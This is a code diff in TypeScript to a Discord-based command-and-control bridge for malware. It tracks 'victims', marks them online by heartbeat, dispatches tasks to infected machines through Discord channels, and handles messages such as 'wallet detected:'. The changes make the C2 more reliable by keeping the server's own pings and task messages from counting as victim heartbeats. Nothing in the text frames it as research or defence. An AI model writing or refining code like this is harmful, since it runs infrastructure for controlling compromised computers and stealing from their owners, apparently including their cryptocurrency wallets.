@@ -45,6 +45,7 @@ let ingested = 0;
 const lastPing = new Map<string, number>();
 let lastBootstrap = 0;
 const pendingSeed = new Map<string, number>();
+const outbound = new Set<string>();
 
 function log(message: string): void {
   console.log(`[discord-bridge] ${message}`);
@@ -228,7 +229,9 @@ async function ensureLinks(): Promise<void> {
 }
 
 async function handleMessage(link: { channelId: string; victimId: string }, message: Message): Promise<void> {
-  await prisma.victim.update({ where: { id: link.victimId }, data: { lastHeartbeatAt: new Date(), status: 'online' } }).catch(() => undefined);
+  if (!outbound.has(message.id)) {
+    await prisma.victim.update({ where: { id: link.victimId }, data: { lastHeartbeatAt: new Date(), status: 'online' } }).catch(() => undefined);
+  }
 
   const embed = message.embeds?.find((item) => item.title === 'Fabric Sync');
   if (embed?.fields) {
@@ -266,6 +269,8 @@ async function handleText(victimId: string, message: Message): Promise<void> {
   if (!content) return;
   const dispatched = await prisma.task.count({ where: { victimId, discordMessageId: message.id } });
   if (dispatched > 0) return;
+  if (content === 'ping') return;
+  if (content.startsWith('pong')) return;
   const seconds = Math.floor(Date.now() / 1000);
 
   if (content.startsWith('wallet detected:')) {
@@ -407,6 +412,7 @@ async function dispatchTasks(): Promise<void> {
         where: { id: task.id },
         data: { status: 'running', leaseUntil: new Date(Date.now() + task.timeoutSec * 1000), attempts: { increment: 1 }, discordMessageId: message.id }
       });
+      outbound.add(message.id);
       lastPing.set(channel, Date.now());
     } catch (error) {
       await prisma.task.update({ where: { id: task.id }, data: { error: error instanceof Error ? error.message : 'send_failed' } });
@@ -435,7 +441,8 @@ async function maybePing(): Promise<void> {
   for (const link of links) {
     if (now - (lastPing.get(link.channelId) ?? 0) < PING_MS) continue;
     try {
-      await rest('POST', `/channels/${link.channelId}/messages`, { content: 'ping', allowed_mentions: { parse: [] } });
+      const msg = await rest<Message>('POST', `/channels/${link.channelId}/messages`, { content: 'ping', allowed_mentions: { parse: [] } });
+      outbound.add(msg.id);
       lastPing.set(link.channelId, now);
     } catch {
       // channel lost
